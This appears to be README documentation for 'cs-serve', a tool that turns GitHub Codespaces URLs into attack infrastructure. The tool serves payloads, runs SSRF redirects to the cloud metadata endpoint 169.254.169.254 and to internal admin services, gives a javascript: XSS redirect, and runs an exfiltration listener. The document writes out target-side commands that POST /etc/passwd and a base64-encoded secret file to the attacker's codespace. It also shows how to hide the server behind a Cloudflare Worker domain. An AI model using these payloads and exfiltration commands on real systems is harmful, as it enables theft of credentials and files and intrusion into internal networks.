# File Hosting

Serve files, redirects, and custom HTTP responses on public HTTPS URLs using GitHub Codespaces.

All servers get a `*.app.github.dev` URL with automatic TLS -- no domain registration or certificate setup required.

## Serve a File

```bash
cs-serve file payload.bin
```

Output includes the public URL:

```
Public URL: https://abc123-9999.app.github.dev/payload.bin
```

### Serve on a custom port

```bash
cs-serve file exploit.html 8888
```

## Serve a Directory

```bash
cs-serve dir ./payloads
```

Files are accessible by direct path. Directory listing is disabled for security.

## SSRF Redirect Server

Redirect incoming requests to an internal target:

```bash
# AWS metadata endpoint
cs-serve redirect http://169.254.169.254/latest/meta-data/

# Internal service
cs-serve redirect http://10.0.0.1:8080/admin

# With custom status code
cs-serve redirect http://internal.target/ 9999 301
```

### JavaScript Protocol Redirect

```bash
cs-serve redirect "javascript:alert(document.domain)"
```

## Custom HTTP Response

Serve arbitrary content with full control over body, content type, and status:

```bash
# JSON response
cs-serve custom 9999 '{"status":"pwned"}' application/json

# HTML page
cs-serve custom 9999 '<html><body>test</body></html>' text/html

# XML response with custom status
cs-serve custom 9999 '<?xml version="1.0"?><root/>' application/xml 201
```

## Data Capture

Capture incoming POST data with automatic base64 detection and decoding:

```bash
cs-serve capture
cs-serve capture 8080
```

Any POST, PUT, or PATCH request to any path is captured. The server:

- Logs each capture with headers, client IP, and a content preview
- Auto-detects base64 payloads and decodes them inline
- Saves raw data as `capture_NNN.bin` and decoded data as `capture_NNN.decoded`
- Downloads all captures to your current directory on `Ctrl+C`

### Example: Exfiltration listener

```bash
# Start the capture server
cs-serve capture

# On the target, exfiltrate data:
# curl -X POST -d @/etc/passwd https://<codespace>-9999.app.github.dev/
# cat secret.txt | base64 | curl -X POST -d @- https://<codespace>-9999.app.github.dev/

# Press Ctrl+C to stop and download all captures locally
```

## Custom Domain via Cloudflare

Proxy through a Cloudflare Worker to serve content on your own domain:

```bash
# Auto-deploy (with CLOUDFLARE_API_TOKEN and CLOUDFLARE_ACCOUNT_ID set)
cs-serve -d dev.example.com file payload.bin
cs-serve -d dev.example.com capture

# Without credentials, generates worker.js for manual deployment
cs-serve -d dev.example.com redirect http://internal:8080/
```

The worker is automatically torn down when you press `Ctrl+C`.

## Real-Time Logging

All servers log incoming requests to stdout in real time. This is useful for:

- Confirming SSRF hits
- Monitoring exfiltration callbacks
- Debugging payload delivery

## Cleanup

```bash
cs-serve stop 9999       # stop a specific server
cs-serve clean           # kill all servers and port forwards
```
